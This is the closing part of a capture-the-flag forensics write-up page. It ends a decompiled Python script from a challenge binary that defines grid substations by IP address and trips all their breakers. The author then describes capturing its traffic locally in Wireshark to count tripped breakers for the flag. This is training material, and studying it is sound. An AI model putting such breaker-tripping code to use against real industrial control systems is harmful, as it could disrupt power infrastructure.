+</span><span>    substation_h </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.87&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">13</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">21</span><span>)])
+</span><span>    substation_i </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.88&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">14</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">13</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">19</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">17</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)])
+</span><span>    substation_a</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_b</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_c</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_d</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_e</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_g</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_h</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span style="font-style:italic;color:#5c6773;"># okay decompiling fate.exe_extracted/trip_breakers.pyc
+</span></code></pre>
+<p>I modified it to connect to localhost so I could packet capture it and then opened it up in wireshark. I applied some filters to only measure tripped breakers (re: OPT_4) and counted the number remaining to get the flag.</p>
+<p>flag{10.95.101.82:200}</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">12 September 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/forensics/">#forensics</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
